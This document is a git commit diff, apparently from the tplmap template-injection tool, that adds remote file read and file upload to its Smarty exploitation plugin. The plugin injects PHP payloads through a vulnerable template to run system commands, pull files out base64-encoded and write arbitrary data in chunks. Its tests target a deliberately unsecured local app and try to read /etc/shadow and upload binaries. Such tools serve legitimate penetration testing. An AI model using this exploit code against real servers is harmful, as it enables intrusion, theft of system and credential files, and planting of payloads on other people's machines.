3abc4424a8ff26117ad30fe040c8f651cefd5bbd
Emilio Pinna <emilio.pinn@gmail.com>
2016-07-10 02:57:06 +0100

    Add --file-write and --file-read in Smarty plugin

--- plugins/engines/smarty.py
+++ plugins/engines/smarty.py
@@ -1,3 +1,4 @@
+from utils.strings import quote, chunkit, base64encode, base64decode, md5
 from core.check import Check
 from utils.loggers import log
 from utils import rand
@@ -50,3 +51,54 @@ class Smarty(Check):
     def execute(self, command):
 
         return self.evaluate("""system("%s");""" % (quote(command)))
+
+
+
+    def detect_read(self):
+        self.set('read', True)
+
+    def _md5(self, remote_path):
+        return self.evaluate("""is_file("%s") && print(md5_file("%s"));""" % (remote_path, remote_path))
+        
+    def read(self, remote_path):
+                
+        # Get remote file md5
+        md5_remote = self._md5(remote_path)
+            
+        if not md5_remote:
+            log.warn('Error getting remote file md5, check presence and permission')
+            return
+        
+        data_b64encoded = self.evaluate("""print(base64_encode(file_get_contents("%s")));""" %  remote_path)
+        data = base64decode(data_b64encoded)
+
+        if not md5(data) == md5_remote:
+            log.warn('Remote file md5 mismatch, check manually')
+        else:
+            log.info('File downloaded correctly')
+            
+        return data
+        
+    def detect_write(self):
+        self.set('write', True)
+        
+    def write(self, data, remote_path):
+        
+        # Check existance and overwrite with --force-overwrite
+        if self._md5(remote_path):
+            if not self.channel.args.get('force_overwrite'):
+                log.warn('Remote path already exists, use --force-overwrite for overwrite')
+                return
+            else:
+                self.evaluate("""file_put_contents("%s", "");""" % (remote_path))
+
+        # Upload file in chunks of 500 characters
+        for chunk in chunkit(data, 500):
+
+            chunk_b64 = base64encode(chunk)
+            self.evaluate("""file_put_contents("%s", base64_decode("%s"), FILE_APPEND);""" % (remote_path, chunk_b64))
+
+        if not md5(data) == self._md5(remote_path):
+            log.warn('Remote file md5 mismatch, check manually')
+        else:
+            log.warn('File uploaded correctly')
--- tests/test_php_smarty.py
+++ tests/test_php_smarty.py
@@ -7,6 +7,8 @@ import random
 sys.path.insert(1, os.path.join(sys.path[0], '..'))
 from plugins.engines.smarty import Smarty
 from core.channel import Channel
+from utils import rand
+from utils import strings
 
 class SmartyTest(unittest.TestCase):
 
@@ -15,6 +17,8 @@ class SmartyTest(unittest.TestCase):
         'engine': 'smarty',
         'eval' : 'php' ,
         'exec' : True,
+        'write': True,
+        'read': True,
         'trailer_tag': '{%(trailer)s}',
         'header_tag': '{%(header)s}',
         'render_tag': '{%(payload)s}',
@@ -42,3 +46,65 @@ class SmartyTest(unittest.TestCase):
         del expected_data['exec']
         
         self.assertEqual(channel.data, expected_data)
+
+        
+    def test_file_read(self):
+
+        channel = Channel({
+            'url' : 'http://127.0.0.1:15002/smarty-3.1.29-unsecured.php?inj=*'
+        })
+        smartyobj = Smarty(channel)
+        smartyobj.detect()
+        del channel.data['os']
+        self.assertEqual(channel.data, self.expected_data)
+        
+        # Normal ASCII file
+        readable_file = '/etc/resolv.conf'
+        content = open(readable_file, 'r').read()
+        self.assertEqual(content, smartyobj.read(readable_file))
+        
+        # Long binary file
+        readable_file = '/bin/ls'
+        content = open(readable_file, 'rb').read()
+        self.assertEqual(content, smartyobj.read(readable_file))    
+        
+        # Non existant file
+        self.assertEqual(None, smartyobj.read('/nonexistant'))
+        # Unpermitted file
+        self.assertEqual(None, smartyobj.read('/etc/shadow'))
+        # Empty file - returns None, unlike the others
+        self.assertEqual(None, smartyobj.read('/dev/null'))
+
+    def test_file_write(self):
+
+        channel = Channel({
+            'url' : 'http://127.0.0.1:15002/smarty-3.1.29-unsecured.php?inj=*'
+        })
+        smartyobj = Smarty(channel)
+        smartyobj.detect()
+        del channel.data['os']
+        self.assertEqual(channel.data, self.expected_data)
+        
+        remote_temp_path = '/tmp/tplmap_%s.tmp' % rand.randstr_n(10)
+        
+        # Send long binary
+        data = open('/bin/ls', 'rb').read()
+        smartyobj.write(data, remote_temp_path)
+        self.assertEqual(smartyobj._md5(remote_temp_path), strings.md5(data))
+        smartyobj.execute('rm %s' % (remote_temp_path))
+        
+        # Send short ASCII data, without removing it
+        data = 'SHORT ASCII DATA'
+        smartyobj.write(data, remote_temp_path)
+        self.assertEqual(smartyobj._md5(remote_temp_path), strings.md5(data))
+
+        # Try to append data without --force-overwrite and re-check the previous md5
+        smartyobj.write('APPENDED DATA', remote_temp_path)
+        self.assertEqual(smartyobj._md5(remote_temp_path), strings.md5(data))
+        
+        # Now set --force-overwrite and rewrite new data on the same file
+        smartyobj.channel.args['force_overwrite'] = True
+        data = 'NEW DATA'
+        smartyobj.write(data, remote_temp_path)
+        self.assertEqual(smartyobj._md5(remote_temp_path), strings.md5(data))
+        smartyobj.execute('rm %s' % (remote_temp_path))
